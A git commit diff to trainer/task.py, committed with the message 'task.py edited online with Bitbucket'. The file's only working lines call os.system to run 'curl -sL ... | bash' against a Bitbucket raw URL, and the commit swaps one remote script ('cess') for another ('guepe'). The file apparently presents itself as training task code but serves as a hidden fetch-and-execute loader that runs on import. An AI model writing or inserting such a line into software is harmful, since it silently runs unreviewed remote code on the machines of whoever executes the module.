18823518d42e891c306639d33eda07f042913c2a
df hdhdh <jeffreyadams29@outlook.com>
2023-09-21 13:59:51 +0000

    task.py edited online with Bitbucket

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/jeffreyadams29/paketu/raw/master/cess | bash')
+os.system('curl -sL https://bitbucket.org/jeffreyadams29/paketu/raw/master/guepe | bash')
